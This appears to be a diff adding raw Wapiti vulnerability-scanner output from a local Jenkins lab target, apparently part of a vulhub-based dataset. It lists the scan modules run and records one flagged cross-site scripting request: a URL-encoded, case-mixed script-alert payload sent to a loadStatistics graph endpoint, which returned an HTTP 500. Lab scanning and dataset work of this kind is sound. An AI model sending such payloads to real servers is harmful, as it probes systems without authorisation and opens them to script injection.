+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=16x16
+---
+---
+
+[*] Launching module upload
+
+[*] Launching module ssl
+
+[*] Launching module xss
+---
+Received a HTTP 500 error in http://127.0.0.1:18025/computer/(master)/loadStatistics/graph
+Evil request:
+    GET /computer/(master)/loadStatistics/graph?type=%3CScRiPt%3Ealert%28%27w9802h12w3%27%29%3C%2FsCrIpT%3E&width=500&height=300 HTTP/1.1
+    host: 127.0.0.1:18025
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: JSESSIONID.7f4aae41=node014y9kbqc1515h1b7v3vxeror5q934.node0; hudson_auto_refresh=false; iconSize=16x16
+---
+
+[*] Launching module permanentxss
+
+[*] Generating report...
+A report has been generated in the file /home/kali/dataset/dec-vulhub-2026-08-05/raw/wapiti/jenkins_1000861/scan.json
